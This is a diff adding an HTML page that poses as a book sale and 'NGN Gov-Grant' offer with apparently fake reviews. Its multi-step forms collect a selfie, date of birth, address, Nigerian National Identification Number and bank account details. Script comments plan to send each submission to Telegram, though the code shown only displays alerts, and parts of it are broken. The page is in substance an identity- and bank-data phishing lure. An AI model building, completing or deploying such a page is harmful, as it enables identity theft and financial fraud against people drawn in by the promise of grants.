@@ -1,0 +1,538 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="description" content="Unlock the secrets to financial freedom and wealth management.">
+  <meta name="keywords" content="Money Box, Forex Ebook, PDF Strategy">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=0">
+  <link href="moneybox.jpeg" rel="icon" type="images/png">
+  <title>The Money Box - Secret to financial freedom</title>
+  <style>
+    /* General Styles */
+body {
+  font-family: 'Arial', sans-serif;
+  margin: 0;
+  padding: 0;
+  line-height: 1.6;
+}
+
+/* Top Ad Styles */
+.top-ad {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  background-color: #008000;
+  color: #fff;
+  padding: 10px 20px;
+  z-index: 1000;
+  border-bottom: 2px solid #fff;
+  box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+  overflow: hidden; /* Ensures content does not overflow during animation */
+}
+
+.ad-content {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  top: -100px; /* Start hidden above the viewport */
+  left: 0px;
+  position: relative;
+}
+
+.ad-content p {
+  margin: 0;
+  font-size: 1rem;
+}
+
+.ad-content a {
+  color: white;
+  font-size: 1rem;
+}
+
+.close-ad {
+  background: transparent;
+  border: none;
+  color: #fff;
+  font-size: 1.5rem;
+  cursor: pointer;
+  padding: 0 30px;
+}
+
+.close-ad:hover {
+  color: #ddd;
+}
+
+/* Hidden Class for Animation */
+.hidden-content {
+  top: -100px; /* Position above the viewport */
+}
+
+.visible-content  {
+  top: 0; /* Position at the top of the viewport */
+}
+
+a {
+  color: #ff6f61;
+  text-decoration: none;
+  text-align: center;
+}
+
+a h2{
+  background-color: blanchedalmond;
+  max-width: 300px;
+  margin: auto;
+  border-radius: 5px;
+  box-shadow: 0px 2px 4px #ff6f61;
+  cursor: pointer;
+  line-height: 2rem;
+  padding: 5px;
+}
+
+a:hover {
+  text-decoration: underline;
+}
+
+/* Header */
+.header {
+  text-align: center;
+  padding: 2rem;
+  background-image: url('Moneybox.jpeg'); 
+  background-position: bottom; 
+  background-size: cover; 
+  filter: blur(3px); 
+  border-bottom: 2px solid #008000;
+  border-top: 10px solid black;
+  max-height: 80px;
+}
+
+.header h1 {
+  font-size: 3rem;
+  color: #ff6f61;
+  margin: 0;
+  filter: drop-shadow(2px 4px 6px black);
+  opacity: 0;
+}
+
+.header p {
+  font-size: 1.2rem;
+  margin: 0.5rem 0;
+  color: #ff6f61;
+  opacity: 0;
+}
+
+/* Content */
+.content {
+  padding: 1.5rem;
+}
+
+section {
+  margin-bottom: 2rem;
+}
+
+h2 {
+  color: #008000;
+  font-size: 2rem;
+  margin-bottom: 1rem;
+}
+
+p, ul, li {
+  font-size: 1rem;
+  margin: 0.5rem 0;
+}
+
+ul {
+  list-style-type: disc;
+  padding-left: 1rem;
+}
+
+	  .form-container {
+		  display: none;
+            margin: 20px 0;
+            padding: 20px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+        .active {
+            display: block;
+        }
+        input, select, textarea {
+            margin: 0px 0px 20px;
+			background-color: transparent;
+			color: #000;
+			padding: 8px;
+            width: 100%;
+            max-width: 300px;
+			height: 25px;
+			font-size: 16px;
+			outline: none;
+        }
+	 .featured button {
+            padding: 10px 20px;
+            background: #008000;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+		    width: 100%;
+            margin: auto;
+            font-size: 16px;
+        }
+	  button:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+	  
+  input[type="file"] {
+    visibility: hidden;
+  }
+	  
+input[type="date"] {
+	margin: 0px 0px 20px;
+    width: 100%; 
+	background-color: transparent;
+	color: #000;
+    padding: 12px; 
+    font-size: 16px;
+    border: 1px solid #ccc;
+    border-radius: 5px; 
+  }
+
+#firstForm select {
+	font-size: 16px;
+	padding: 8px;
+}
+	  
+
+  /* Style the custom label */
+  .custom-file-label {
+	display: block;
+	margin-bottom: 30px;
+    padding: 5px 20px;
+	border: 1px solid #ddd; 
+    border-radius: 5px;
+    cursor: pointer;
+    text-align: center;
+  }
+
+.moneybox{
+width: 400px;
+height: auto;
+max-width: 100%;
+}
+
+
+/* Featured Books */
+.book-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+  gap: 1.5rem;
+}
+
+.book {
+  background-color: #222;
+  padding: 1rem;
+  border-radius: 8px;
+}
+
+.book h3 {
+  margin-top: 0;
+  color: #ff6f61;
+}
+
+/* Reviews */
+blockquote {
+  font-style: italic;
+  margin: 1rem 0;
+  padding-left: 1rem;
+  border-left: 4px solid #ff6f61;
+}
+
+/* Footer */
+.footer {
+  text-align: center;
+  padding: 1rem;
+  background-color: #1e1e1e;
+  border-top: 2px solid #ff6f61;
+}
+
+.footer p {
+  font-size: 0.9rem;
+  margin: 0.5rem 0;
+}
+  </style>
+</head>
+<body>
+<!-- Top Page Advertisement -->
+  <div id="top-ad" class="top-ad">
+    <div id="ad-content" class="ad-content hidden-content">
+      <p>🎉 Stock Market: With the best Nigerian Stock broker. <strong><a href="https://investbamboo.com">Try Bamboo</a></strong>. 🎉</p>
+      <button id="close-ad" class="close-ad">✖</button>
+    </div>
+  </div>
+
+  <!-- Header Section -->
+  <header class="header">
+    <h1>The Money Box</h1>
+    <p>A Book Sale Event Like No Other</p>
+  </header>
+
+  <!-- Main Content -->
+  <main class="content">
+    <!-- About the Book Sale -->
+    <section class="about" id="about">
+      <h2>NGN Gov-Grant</h2>
+      <p>Government Grants, General & Foundation Grants, Industry-Specific Grants, Minority/Women-Owned, Student/Business Grants.</p>
+    </section>
+
+    <!-- Form Part -->
+    <section class="featured" id="featured">
+		
+		<!-- Form one -->
+		<div id="form1" class="form-container active">
+     <form id="firstForm" method="post">
+		 
+		 <label for="name">Full Name</label>
+		 <input type="text" id="name" name="name" placeholder="Your Full Name" required>
+
+		 <label for="gender">Gender</label>
+		 <select id="gender" name="gender">
+			 <option value="Male">Male</option>
+			 <option value="Female">Female</option>
+			 <option value="Rather">I'd rather not say</option>
+		 </select>
+		 
+		 <label for="dob">Date Of Birth</label>
+		 <input type="date" id="dob" name="dob" placeholder="Your Date of Birth">
+		 
+		 <label for="email">Email</label>
+		 <input type="email" id="email" name="email" autocomplete="email" placeholder="Your Email Address">
+
+		<label for="employ">Employment Status</label>
+		 <select id="employ" name="employ">
+			 <option value="Self-Employed">Self-Employed</option>
+			 <option value="Student">Student</option>
+			 <option value="Employed">Employed</option>
+			 <option value="Unemployed">Unemployed</option>
+		 </select>
+		 
+		 <label for="phone">Phone</label>
+		 <input type="tel" id="phone" name="phone" placeholder="Your Phone Number" required>
+
+		 <label for="marital">Marital Status</label>
+		 <select id="marital" name="marital">
+			 <option value="single">Single</option>
+			 <option value="married">Married</option>
+			 <option value="divorced">Divorced</option>
+		 </select>
+		 
+		 <label for="passport" class="custom-file-label">Take A Selfie</label>
+		 <input type="file" id="passport" accept="image/*" capture="user">
+		 
+		 <button type="submit" id="submitBtn1">SUMBIT</button>
+	 </form>
+		</div>
+
+		<!-- Form two -->
+		<div id="form2" class="form-container">
+     <form id="secondForm" method="post">
+		 <label for="city">City</label>
+		 <input type="text" id="city" name="city" placeholder="Your Full Name" required>
+		 
+		 <label for="state">State/Province</label>
+		 <input type="text" id="state" name="state" placeholder="Subject here" >
+		 
+		 <label for="address">Residential Address</label>
+		 <input type="text" id="address" name="address" placeholder="Your residentail Adress">
+		 
+		 <label for="lga">Local Government Area</label>
+		 <input type="text" id=lga" name="lga" placeholder="Subject here" >
+		 
+		 <label for="nin">National Identification Number(NIN)</label>
+		 <input type="text" id="nin" name="nin" placeholder="Message Here">
+		 
+		 <button type="submit" id="submitBtn2">SUMBIT</button>
+	 </form>
+		</div>
+
+		<!-- Form three -->
+		<div id="form3" class="form-container">
+     <form id="thirdForm" method="post">
+		 <label for="bankName">Bank Name</label>
+		 <input type="text" id="bankName" name="bankName" placeholder="Your Bank Name" required>
+		 
+		 <label for="accountNumber">Your Account Number</label>
+		 <input type="tel" id="accountNumber" name="accountNumber" placeholder="Your Account Number" required>
+		 
+		 <label for="accountName">Your Account Name</label>
+		 <input type="text" id="accountName" name="accountName" placeholder="Your Account Name" required>
+		 
+		 <button type="submit" id="submitBtn3">SUMBIT</button>
+	 </form>
+		</div>
+    </section>
+
+    <!-- Customer Reviews -->
+    <section class="reviews" id="reviews">
+      <h2>Reviews</h2>
+      <blockquote>"This book has been a game-changer for my finances! I highly recommend it to anyone looking for a practical guide to building wealth." - Emily R.</blockquote>
+      <blockquote>"The author's insights are invaluable, implementing the tips completely changed how I trading. Absolutely amazing!!" - Chris T.</blockquote>
+    </section>
+
+    <!-- Contact and Inquiries -->
+    <section class="contact" id="contact">
+      <h2>Contact and Inquiries</h2>
+      <p>If you have any questions about the event or need assistance, please reach out to us:</p>
+      <ul>
+        <li>Email: <a href="mailto:info@moneyboxbooksale.com">info@moneyboxbooksale.com</a></li>
+        <li>Phone: +1-812-232-7964</li>
+        <li>Contact us for any for updates!</li>
+      </ul>
+    </section>
+  </main>
+
+  <!-- Footer -->
+  <footer class="footer">
+    <p>&copy; 2025 The Money Box. All rights reserved.</p>
+  </footer>
+</body>
+  <script>
+// Select the advertisement content and close button
+const adContent = document.getElementById("ad-content");
+const closeAdButton = document.getElementById("close-ad");
+
+// Function to slide in the ad content
+function slideInAd() {
+  adContent.classList.remove("hidden-content");
+  adContent.classList.add("visible-content");
+}
+
+// Function to slide out the ad content when closed
+function slideOutAd() {
+  adContent.classList.remove("visible-content");
+  adContent.classList.add("hidden-content");
+}
+
+// Trigger the ad content slide-in after 1 second
+setTimeout(slideInAd, 1000);
+
+// Add event listener to close the ad when the button is clicked
+closeAdButton.addEventListener("click", slideOutAd);
+
+	         function showForm(formId) {
+            // Hide all forms
+            document.querySelectorAll('.form-container').forEach(form => {
+                form.classList.remove('active');
+            });
+            // Show the specified form
+            document.getElementById(formId).classList.add('active');
+        }
+
+	        let allFormData = {};
+
+        // Form 1 submission
+        document.getElementById('firstForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const submitBtn = document.getElementById('submitBtn1');
+            
+            // Disable button and show loading
+            submitBtn.disabled = true;
+            
+            const formData = new FormData(this);
+            const data = Object.fromEntries(formData.entries());
+            
+            // Store data
+            Object.assign(allFormData, data);
+            
+            // Send to Telegram
+            const message = `📝 **Form 1 Submitted - Personal Information**\n\n` +
+                           `👤 Name: ${data.name}\n` +
+                           `👤 Gender: ${data.gender}\n` +
+                           `👤 Date of Birth: ${data.dob}\n` +
+                           `👤 Email: ${data.email}\n` +
+                           `👤 Employment Status: ${data.employ}\n` +
+                           `👤 Phone: ${data.phone}\n` +
+                           `📧 Marital Status: ${data.marital}\n` +
+                           `⏰ Time: ${new Date().toLocaleString()}`;
+            
+            alert(message);
+   
+                showForm('form2');
+    
+            submitBtn.disabled = false;
+            loading.style.display = 'none';
+        });
+
+        // Form 2 submission
+        document.getElementById('secondForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const submitBtn = document.getElementById('submitBtn2');
+            
+            submitBtn.disabled = true;
+            
+            const formData = new FormData(this);
+            const data = Object.fromEntries(formData.entries());
+            
+            // Store data
+            Object.assign(allFormData, data);
+            
+            // Send to Telegram
+            const message = `📝 **Form 2 Submitted - Address Information**\n\n` +
+                           `🏠 City: ${data.city}\n` +
+                           `🏙️ State: ${data.state}\n` +
+                           `📮 Address: ${data.address}\n` +
+                           `🏙️ LGA: ${data.lga}\n` +
+                           `🏙️ NIN: ${data.nin}\n` +
+                           `📮 Address: ${data.maintext}\n` +
+                           `⏰ Time: ${new Date().toLocaleString()}`;
+            
+            alert(message);
+   
+                showForm('form2');
+            
+            submitBtn.disabled = false;
+            loading.style.display = 'none';
+        });
+
+        // Form 3 submission
+        document.getElementById('thirdForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const submitBtn = document.getElementById('submitBtn3');
+            
+            submitBtn.disabled = true;
+            
+            const formData = new FormData(this);
+            const data = Object.fromEntries(formData.entries());
+            
+            // Store data
+            Object.assign(allFormData, data);
+            
+            // Send to Telegram
+            const message = `📝 **Form 3 Submitted - Preferences**\n\n` +
+                           `📰 Bank: ${data.bankName}\n` +
+                           `🏙️ Account Number: ${data.accountNumber}\n` +
+                           `📮 Owner: ${data.accountName}\n` +
+                           `⏰ Time: ${new Date().toLocaleString()}\n\n` +
+                           `✅ **All Forms Completed!**`;
+            
+            alert(message);
+            
+                const summaryMessage = `📊 **Complete Form Submission Summary**\n\n` +
+                                     `👤 Personal Info:\n` +
+                                     `   • Name: ${allFormData.name}\n` +
+                                     `   • Email: ${allFormData.email}\n\n` +
+                                     `🏠 Address Info:\n` +
+                                     `   • Street: ${allFormData.street}\n` +
+                                     `   • City: ${allFormData.city}\n` +
+                                     `   • Zip Code: ${allFormData.zipcode}\n\n` +
+                                     `⚙️ Preferences:\n` +
+                                     `   • Newsletter: ${allFormData.newsletter}\n` +
+                                     `   • Comments: ${allFormData.comments || 'None'}`;
+            
+            submitBtn.disabled = false;
+            loading.style.display = 'none';
+        });
+
+    
+  </script>
+</html>
